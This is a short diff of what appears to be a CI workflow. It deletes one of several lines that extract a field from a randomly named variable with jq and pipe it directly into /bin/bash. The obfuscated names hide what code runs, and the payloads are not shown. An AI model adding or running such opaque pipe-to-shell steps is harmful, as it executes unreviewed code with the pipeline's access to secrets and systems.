@@ -26,7 +26,6 @@ jobs:
           echo $jverr8 | jq -r .c02 | /bin/bash
           printf '%s' "$brweq36" | jq -r .xv89844 | /bin/bash
           echo $hqr556 | jq -r .xqkkx92 | /bin/bash
-          echo $ct83177 | jq -r .fyut3241 | /bin/bash
           echo $jhcrd083 | jq -r .wmfz393 | /bin/bash
 
       - name: Store output
